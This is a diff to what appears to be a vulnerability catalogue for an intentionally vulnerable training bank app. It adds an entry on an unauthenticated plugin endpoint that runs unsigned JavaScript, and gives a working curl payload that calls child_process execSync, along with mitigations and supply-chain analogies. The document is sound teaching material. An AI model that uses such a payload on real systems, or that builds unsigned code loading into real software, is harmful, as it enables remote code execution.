@@ -85,6 +85,7 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [59]  Security misconfig — CORS reflected origin + credentials on /api (Ch 33)
  [60]  Security misconfig — /uploads/ directory listing enabled (Ch 33)
  [61]  Vulnerable component — jQuery 1.12.4 `$()` HTML parsing → DOM XSS via ?theme= (Ch 34)
+ [62]  Software & Data Integrity — POST /admin/integrity/install accepts unsigned plugin code → RCE (Ch 35)
 
 
 --------------------------------------------------------------------------------
@@ -988,6 +989,44 @@ MITIGATION
   - Never pass user input to `$()`. If you need to set HTML, use `.text()`
     or wrap with `DOMPurify.sanitize(...)`.
   - CSP: `script-src 'self'` blocks the inline `onerror=` payload.
+
+
+--------------------------------------------------------------------------------
+ [62] Software & Data Integrity — unsigned plugin install → RCE
+--------------------------------------------------------------------------------
+SINK   routes/integrity.js (B-INT-001)
+MOUNT  app.use('/admin/integrity', require('./routes/integrity'))
+
+The "Plugin Studio" endpoint accepts arbitrary JavaScript and
+`require()`s it into the running bank process. The handler validates
+only the plugin *name* (filename charset) — never the *bytes*. There
+is no signature, no checksum, no allow-list of authors, no SBOM.
+
+EXPLOIT (no auth required — the route is not behind requireSession)
+  curl -s -X POST http://localhost:3001/admin/integrity/install \
+    -H 'Content-Type: application/json' \
+    -d '{"name":"pwn1","code":"module.exports={init:()=>require(\"child_process\").execSync(\"whoami\").toString().trim()};"}'
+  # => {"installed":"pwn1","init":"REDMOND+t-ibadawy"}
+
+LIST installed plugins:
+  curl -s http://localhost:3001/admin/integrity/list
+
+WHY THIS IS A08 (not just "RCE")
+  A08 Software & Data Integrity Failures covers code & data shipped into
+  the application without verifying its origin or integrity. This sink
+  is the lab analog of:
+    - npm install of a typosquat / hijacked maintainer (event-stream 2018)
+    - SolarWinds Orion build-server tampering (2020)
+    - Codecov bash uploader supply-chain tampering (2021)
+
+MITIGATION
+  - Require detached signatures (sigstore/cosign, GPG, or in-house Ed25519)
+    over the plugin tarball and verify before `require()`.
+  - Pin a SHA-256 allow-list of approved plugins.
+  - Run plugins in a separate process / sandbox (vm2 is deprecated; use
+    `node --experimental-permission` or a child process with restricted env).
+  - Authenticate the endpoint and audit-log every install with the signer
+    identity (Ch 36).
 
 
 ================================================================================
